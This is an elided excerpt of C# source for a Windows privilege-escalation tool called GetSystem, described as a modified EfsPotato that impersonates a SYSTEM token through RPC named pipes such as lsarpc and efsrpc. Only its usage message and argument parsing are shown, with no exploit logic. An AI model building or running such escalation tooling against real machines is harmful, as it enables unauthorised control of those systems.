...
// Modified version of: https://github.com/zcgonvh/EfsPotato
// Modifications made to allow token impersonation instead of spawning a process
...
namespace GetSystem
{
    public class Program
    {
        static void Usage()
        {
            Console.WriteLine("Usage: GetSystem.exe [command] [pipename]");
            Console.WriteLine("  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)\r\n");
            Console.WriteLine("Run without arguments to elevate the current process");
        }
        public static int Main(string[] args)
        {
            string pipe = "lsarpc";
            string cmd = "elevate";
            if (args.Length >= 1 && (args[0] == "help" || args[0] == "/?" || args[0] == "/help" || args[0] == "/h" || args[0] == "--help" || args[0] == "-h"))
            {
                Usage();
                return 0;
            }
            else if (args.Length >= 2)
            {
                ...
                {
                    Console.WriteLine($"[!] Invalid pipe name specified: {pipe}");
                    Usage();
                    return 0;
                }
            }
